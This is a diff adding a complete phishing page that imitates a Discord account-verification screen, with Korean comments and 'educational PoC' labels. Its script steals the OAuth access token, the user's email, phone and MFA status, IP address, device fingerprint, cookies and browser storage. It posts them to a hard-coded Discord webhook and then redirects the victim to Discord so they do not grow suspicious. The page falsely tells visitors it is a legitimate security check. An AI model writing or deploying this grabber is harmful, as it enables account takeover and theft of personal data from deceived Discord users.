@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord — Verification Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #313338;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+        .card {
+            background: #2b2d31;
+            border-radius: 8px;
+            padding: 32px 40px;
+            width: 480px;
+            max-width: 90vw;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+            text-align: center;
+        }
+        .logo { margin-bottom: 24px; }
+        .logo svg { width: 48px; height: 48px; }
+        h1 { color: #f2f3f5; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+        .subtitle { color: #b5bac1; font-size: 15px; margin-bottom: 24px; line-height: 1.5; }
+        .btn {
+            background: #5865F2;
+            color: #fff;
+            border: none;
+            padding: 14px 44px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover { background: #4752C4; }
+        .footer { color: #4e5058; font-size: 12px; margin-top: 24px; }
+        .badge {
+            display: inline-block;
+            background: #23a55a;
+            color: #fff;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-left: 6px;
+            vertical-align: middle;
+        }
+        .status { color: #b5bac1; font-size: 13px; margin-top: 16px; min-height: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <!-- Discord Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 48 48" fill="none">
+                <path d="M40 12.5c-3.13-1.47-6.47-2.5-10-2.97l-1.33 2.66c-3.27-.49-6.6-.49-9.87 0L17.34 9.53C13.7 10 10.36 11.13 7.23 12.6L4 31.6c.67 4.07 3.3 7.58 7.33 9.83 4.2 2.23 8.2 2.73 10.97 2.93l2.33-2.83c-1.33-.13-2.77-.37-4.33-.87l1.37-1.67c2.37.6 4.7.9 7 .9s4.63-.3 7-.9l1.37 1.67c-1.56.5-3 .77-4.33.87l2.33 2.83c2.77-.2 6.77-.7 10.97-2.93 4.03-2.25 6.66-5.76 7.33-9.83L40 12.5zM19.33 26.17c-1.93 0-3.5-1.77-3.5-3.93s1.57-3.93 3.5-3.93 3.5 1.77 3.5 3.93-1.57 3.93-3.5 3.93zm9.34 0c-1.93 0-3.5-1.77-3.5-3.93s1.57-3.93 3.5-3.93 3.5 1.77 3.5 3.93-1.57 3.93-3.5 3.93z" fill="#5865F2"/>
+            </svg>
+        </div>
+
+        <h1>Verify your account</h1>
+        <p class="subtitle">
+            We've detected unusual activity on your Discord account.<br>
+            Please verify your identity to continue.
+        </p>
+
+        <!-- OAuth 버튼 ⚠️ 아래 CLIENT_ID를 자신의 것으로 교체하세요 -->
+        <a class="btn" id="oauthBtn" href="#">
+            Verify with Discord
+        </a>
+
+        <div class="status" id="status"></div>
+        <div class="footer">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="#4e5058" style="vertical-align:middle;margin-right:4px;">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+            </svg>
+            This is a legitimate security check
+        </div>
+    </div>
+
+    <!-- ========== 정보 수집 + 웹훅 전송 스크립트 ========== -->
+    <script>
+    // ╔══════════════════════════════════════════════════════════════╗
+    // ║  Discord OAuth Token & Info Grabber — EDUCATIONAL PoC       ║
+    // ║  침투테스트 학습용 — 승인된 환경에서만 사용                  ║
+    // ╚══════════════════════════════════════════════════════════════╝
+
+    // ── 설정 ───────────────────────────────────────────────────────
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1531490539118268426/tShqjMHIzUcZ8KToGh-_S_YO25qBm2gYC9KChCKWAjNDrj3dmKbsYQ1VksQeLo_aY3aO';
+
+    // ⚠️⚠️⚠️ 중요: Discord Developer Portal에서 OAuth2 앱을 등록하고
+    // CLIENT_ID와 REDIRECT_URI를 아래에 설정하세요 ⚠️⚠️⚠️
+    const CLIENT_ID = '1531492945558114366';  // ← 여기에 실제 Client ID 입력
+    const REDIRECT_URI = window.location.href.split('?')[0].split('#')[0]; // 현재 페이지 URL
+
+    // OAuth URL 생성
+    const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email`;
+
+    // ── OAuth 버튼 설정 ──────────────────────────────────────────
+    document.getElementById('oauthBtn').href = OAUTH_URL;
+
+    // ── 유틸: IP 확인 ────────────────────────────────────────────
+    async function getIP() {
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            return d.ip;
+        } catch { return 'Unknown'; }
+    }
+
+    // ── 유틸: GPU 정보 ───────────────────────────────────────────
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return 'WebGL not supported';
+            return `${gl.getParameter(gl.VENDOR)} | ${gl.getParameter(gl.RENDERER)}`;
+        } catch { return 'Unknown'; }
+    }
+
+    // ── 유틸: localStorage 크기 계산 ─────────────────────────────
+    function getStorageSize() {
+        try {
+            let total = 0;
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const val = localStorage.getItem(key);
+                total += (key.length + val.length) * 2; // UTF-16
+            }
+            return (total / 1024).toFixed(1) + ' KB';
+        } catch { return 'Unknown'; }
+    }
+
+    // ── 메인: 웹훅 전송 ──────────────────────────────────────────
+    async function sendToWebhook(data) {
+        const embed = {
+            embeds: [{
+                title: '🎣 Discord 1-Click Grab — OAuth PoC',
+                color: 0xED4245,
+                thumbnail: data.avatarURL ? { url: data.avatarURL } : undefined,
+                fields: [
+                    { name: '🆔 User', value: `${data.username}#${data.discriminator}`, inline: true },
+                    { name: '📧 Email', value: `||${data.email}||`, inline: true },
+                    { name: '🔐 MFA', value: data.mfaEnabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                    { name: '✅ Verified', value: data.verified ? 'Yes' : 'No', inline: true },
+                    { name: '📱 Phone', value: data.phone || 'None', inline: true },
+                    { name: '⭐ Nitro', value: data.nitro, inline: true },
+                    { name: '🌐 IP', value: `||${data.ip}||`, inline: true },
+                    { name: '📍 Locale', value: data.locale, inline: true },
+                    { name: '🕐 Timezone', value: data.timezone, inline: true },
+                    { name: '🖥️ Platform', value: data.platform, inline: true },
+                    { name: '🌍 Language', value: data.language, inline: true },
+                    { name: '📺 Screen', value: data.screen, inline: true },
+                    { name: '🧠 CPU', value: `${data.cpuCores} cores`, inline: true },
+                    { name: '💾 RAM', value: data.ram, inline: true },
+                    { name: '🎮 GPU', value: data.gpu.substring(0, 100), inline: true },
+                    { name: '🍪 Cookies', value: data.cookies.substring(0, 1024) || 'None', inline: false },
+                    { name: '📄 User Agent', value: '```\n' + data.userAgent.substring(0, 900) + '\n```', inline: false },
+                    { name: '🔑 Access Token', value: '```\n' + data.token.substring(0, 1900) + '\n```', inline: false },
+                    { name: '💾 LocalStorage', value: '```json\n' + JSON.stringify(data.localStorage).substring(0, 900) + '\n```', inline: false },
+                    { name: '📦 Storage Size', value: data.storageSize, inline: true },
+                    { name: '🔗 Referrer', value: data.referrer || 'Direct', inline: true },
+                    { name: '⏱ Timestamp', value: data.timestamp, inline: false }
+                ],
+                footer: { text: 'Educational PoC — Authorized Pentesting Only' },
+                timestamp: data.timestamp
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            });
+        } catch {}
+
+        // 백업: raw JSON 전송
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '```json\n' + JSON.stringify(data, null, 2).substring(0, 1900) + '\n```'
+                })
+            });
+        } catch {}
+    }
+
+    // ── 메인 실행 ─────────────────────────────────────────────────
+    (async () => {
+        const status = document.getElementById('status');
+
+        try {
+            // 1. URL fragment에서 access_token 추출
+            const fragment = new URLSearchParams(window.location.hash.substring(1));
+            const token = fragment.get('access_token');
+            const tokenType = fragment.get('token_type');
+
+            if (!token) {
+                // 토큰이 없으면 아무것도 안 함 (OAuth 버튼만 보여줌)
+                status.textContent = '';
+                return;
+            }
+
+            // ── 토큰 획득! 정보 수집 시작 ──
+            status.textContent = '✅ Verification in progress...';
+            document.getElementById('oauthBtn').classList.add('hidden');
+
+            // 2. Discord API → 사용자 정보
+            const userRes = await fetch('https://discord.com/api/v10/users/@me', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            const user = await userRes.json();
+
+            // 3. IP 확인
+            const ip = await getIP();
+
+            // 4. 기기/브라우저 정보 수집
+            const deviceInfo = {
+                token: token,
+                tokenType: tokenType || 'Bearer',
+                userId: user.id,
+                username: user.global_name || user.username,
+                discriminator: user.discriminator,
+                email: user.email || 'Not provided',
+                verified: user.verified,
+                mfaEnabled: user.mfa_enabled,
+                phone: user.phone || 'None',
+                locale: user.locale || 'Unknown',
+                nitro: ['None', 'Nitro Classic', 'Nitro', 'Nitro Basic'][user.premium_type] || 'Unknown',
+                avatarURL: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null,
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages.join(', '),
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+                gpu: getGPUInfo(),
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                availScreen: `${screen.availWidth}x${screen.availHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                cookies: document.cookie || 'No cookies (cross-origin expected)',
+                localStorage: { ...localStorage },
+                sessionStorage: { ...sessionStorage },
+                storageSize: getStorageSize(),
+                referrer: document.referrer || 'Direct',
+                pageUrl: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+
+            // 5. 웹훅 전송
+            await sendToWebhook(deviceInfo);
+
+            status.textContent = '✅ Verification complete. Redirecting to Discord...';
+
+            // 6. 피해자가 의심하지 않도록 Discord로 리디렉트
+            setTimeout(() => {
+                window.location.href = 'https://discord.com/channels/@me';
+            }, 2000);
+
+        } catch (err) {
+            status.textContent = '⚠️ An error occurred. Please try again.';
+            // 에러도 웹훅 전송
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '```\nError: ' + err.message + '\n```' })
+                });
+            } catch {}
+        }
+    })();
+    </script>
+</body>
+</html>
